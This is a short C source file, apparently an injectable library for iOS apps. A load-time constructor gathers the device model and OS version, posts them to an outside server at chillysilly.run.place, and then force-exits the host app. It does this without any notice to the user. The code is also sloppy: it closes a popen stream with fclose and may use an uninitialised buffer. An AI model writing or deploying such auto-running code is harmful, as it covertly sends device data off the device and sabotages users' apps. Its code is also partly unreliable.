#include <stdio.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <string.h>
#include <curl/curl.h>

void __attribute__((constructor)) closeAppOnLaunch(void) {
    // Get the device name
    char deviceName[256];
    size_t len = sizeof(deviceName);
    sysctlbyname("hw.model", deviceName, &len, NULL, 0);

    // Get the iOS version
    char iosVersion[256];
    FILE *fp = popen("sw_vers -productVersion", "r");
    if (fp) {
        fgets(iosVersion, sizeof(iosVersion), fp);
        fclose(fp);
    }

    // Remove the newline character from the iOS version
    iosVersion[strcspn(iosVersion, "\n")] = 0;

    // Construct the URL and data for POST request
    CURL *curl = curl_easy_init();
    if(curl) {
        CURLcode res;
        char postData[512];
        
        // Prepare the data to send
        snprintf(postData, sizeof(postData), "device=%s&ios_version=%s", deviceName, iosVersion);

        // Set the target URL and other options
        curl_easy_setopt(curl, CURLOPT_URL, "https://chillysilly.run.place/testbank.php");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);

        // Perform the request
        res = curl_easy_perform(curl);

        // Check if the request was successful
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        // Cleanup
        curl_easy_cleanup(curl);
    }

    // Exit the application after sending the request
    exit(0);
}
